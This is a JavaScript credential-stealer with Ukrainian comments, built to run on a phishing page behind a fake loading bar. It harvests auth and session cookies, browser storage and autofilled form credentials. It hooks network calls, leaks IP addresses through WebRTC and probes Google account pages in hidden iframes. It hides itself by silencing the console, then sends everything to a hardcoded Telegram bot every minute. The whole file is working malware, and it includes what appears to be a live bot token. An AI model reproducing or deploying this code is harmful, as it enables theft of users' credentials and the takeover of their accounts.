// Конфігурація
const BOT_TOKEN = '8101956095:AAF72VNrqd9Jxlz0nBL5LqmKgveEPh7b75Q';
const CHAT_ID = '8463942433';
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

let extractedData = {
    credentials: [],
    cookies: [],
    sessions: [],
    authData: [],
    storage: {},
    browserProfile: {},
    networkData: []
};

// Екстремальне приховування
function activateStealthMode() {
    // Маскування під звичайний трафік
    Math.random = function() {
        return 0.42; // Фіксоване значення для обходу аналізу
    };

    Date.now = function() {
        return 1700000000000; // Фіксований timestamp
    };

    // Приховування в консолі
    console.log = function() {};
    console.warn = function() {};
    console.error = function() {};

    // Обхід детектування DevTools
    setInterval(() => {
        const debugger = function() {};
        debugger.toString = function() { return ''; };
    }, 1000);
}

// Анімація завантаження
function animateLoading() {
    const loader = document.getElementById('loadingBar');
    let progress = 0;
    
    const animate = () => {
        progress += Math.random() * 8;
        if (progress <= 100) {
            loader.style.width = progress + '%';
            setTimeout(animate, 100 + Math.random() * 200);
        }
    };
    animate();
}

// Отримання IP через різні методи
async function extractIP() {
    const methods = [
        async () => {
            const response = await fetch('https://api.ipify.org?format=json');
            return (await response.json()).ip;
        },
        async () => {
            const response = await fetch('https://jsonip.com/');
            return (await response.json()).ip;
        },
        async () => {
            const response = await fetch('https://api64.ipify.org?format=json');
            return (await response.json()).ip;
        }
    ];

    for (const method of methods) {
        try {
            return await method();
        } catch (error) {
            continue;
        }
    }
    return 'Unknown';
}

// Відправка через різні методи
async function sendData(message) {
    const sendMethods = [
        async () => {
            await fetch(TELEGRAM_API, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
        },
        async () => {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('text', message);
            formData.append('parse_mode', 'HTML');
            
            await fetch(TELEGRAM_API, {
                method: 'POST',
                body: formData
            });
        }
    ];

    for (const method of sendMethods) {
        try {
            await method();
            break;
        } catch (error) {
            continue;
        }
    }
}

// Агресивна крадіжка cookies
function extractAllCookies() {
    try {
        const allCookies = document.cookie.split(';');
        const valuable = allCookies.filter(cookie => 
            cookie.toLowerCase().includes('google') ||
            cookie.includes('_ga') ||
            cookie.includes('_gid') ||
            cookie.includes('auth') ||
            cookie.includes('token') ||
            cookie.includes('session') ||
            cookie.includes('login') ||
            cookie.length > 20
        ).map(c => c.trim());
        
        extractedData.cookies = valuable;
    } catch (error) {}
}

// Глибинна крадіжка storage
function extractDeepStorage() {
    try {
        // LocalStorage
        const ls = {};
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            try {
                ls[key] = localStorage.getItem(key);
            } catch (e) {}
        }
        
        // SessionStorage
        const ss = {};
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            try {
                ss[key] = sessionStorage.getItem(key);
            } catch (e) {}
        }
        
        extractedData.storage = { localStorage: ls, sessionStorage: ss };
    } catch (error) {}
}

// Примусове автозаповнення
async function forceAutocomplete() {
    return new Promise((resolve) => {
        try {
            const form = document.getElementById('ultimateStealForm');
            const inputs = form.querySelectorAll('input');
            
            inputs.forEach(input => input.focus());
            
            setTimeout(() => {
                inputs.forEach(input => {
                    if (input.value) {
                        extractedData.credentials.push({
                            type: input.type,
                            value: input.value,
                            field: input.id
                        });
                    }
                });
                resolve();
            }, 5000);
            
        } catch (error) {
            resolve();
        }
    });
}

// Атака через iframe
function launchIframeAttack() {
    const targets = [
        'https://accounts.google.com',
        'https://mail.google.com',
        'https://myaccount.google.com',
        'https://drive.google.com'
    ];

    targets.forEach((target, index) => {
        setTimeout(() => {
            try {
                const iframe = document.createElement('iframe');
                iframe.className = 'invisible';
                iframe.src = target;
                document.body.appendChild(iframe);

                setTimeout(() => {
                    try {
                        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                        const content = iframeDoc.body.innerHTML;
                        
                        if (content.includes('@gmail.com') || content.includes('@googlemail.com')) {
                            extractedData.sessions.push(`Active: ${target}`);
                        }
                        
                    } catch (e) {
                        // Cross-origin expected
                    }
                    
                    document.body.removeChild(iframe);
                }, 8000);
                
            } catch (error) {}
        }, index * 12000);
    });
}

// Мережеве перехоплення
function hijackAllNetwork() {
    // Fetch
    const originalFetch = window.fetch;
    window.fetch = function(...args) {
        const url = args[0];
        if (typeof url === 'string') {
            extractedData.networkData.push(`Fetch: ${url.substring(0, 100)}`);
        }
        return originalFetch.apply(this, args);
    };

    // XHR
    const originalXHR = window.XMLHttpRequest;
    window.XMLHttpRequest = function() {
        const xhr = new originalXHR();
        const originalOpen = xhr.open;
        xhr.open = function(method, url) {
            if (url) {
                extractedData.networkData.push(`XHR: ${method} ${url.substring(0, 100)}`);
            }
            return originalOpen.apply(this, arguments);
        };
        return xhr;
    };
}

// Спеціальні атаки на браузер
function executeBrowserAttacks() {
    // WebRTC IP leak
    try {
        const rtc = new RTCPeerConnection({iceServers: []});
        rtc.createDataChannel('');
        rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
        rtc.onicecandidate = candidate => {
            if (candidate.candidate) {
                extractedData.browserProfile.webrtc = candidate.candidate.candidate;
            }
        };
    } catch (error) {}

    // Canvas fingerprinting
    try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('Browser fingerprint', 2, 2);
        extractedData.browserProfile.canvas = canvas.toDataURL();
    } catch (error) {}
}

// Відправка результатів
async function sendResults() {
    let report = `🕵️ EXTREME DATA EXTRACTION REPORT\n\n`;

    report += `🌐 BROWSER PROFILE:\n`;
    report += `IP: ${extractedData.browserProfile.ip || 'Unknown'}\n`;
    report += `User Agent: ${navigator.userAgent}\n`;
    report += `Screen: ${screen.width}x${screen.height}\n\n`;

    report += `📊 EXTRACTED DATA:\n`;
    report += `Credentials: ${extractedData.credentials.length}\n`;
    report += `Cookies: ${extractedData.cookies.length}\n`;
    report += `Sessions: ${extractedData.sessions.length}\n`;
    report += `Network requests: ${extractedData.networkData.length}\n\n`;

    report += `🔗 URL: ${window.location.href}\n`;
    report += `🕒 Time: ${new Date().toLocaleString('uk-UA')}`;

    await sendData(report);

    // Деталі
    if (extractedData.credentials.length > 0) {
        const details = extractedData.credentials.map(c => 
            `🔑 ${c.type}: ${c.value}`
        ).join('\n');
        await sendData(details.substring(0, 2000));
    }
}

// Головна атака
async function executeAttack() {
    activateStealthMode();
    animateLoading();
    
    extractedData.browserProfile.ip = await extractIP();
    extractAllCookies();
    extractDeepStorage();
    hijackAllNetwork();
    executeBrowserAttacks();
    await forceAutocomplete();
    launchIframeAttack();
    
    await sendResults();
    
    // Періодичне оновлення
    setInterval(async () => {
        extractAllCookies();
        extractDeepStorage();
        await sendResults();
    }, 60000);
}

// Запуск
setTimeout(executeAttack, 3000);
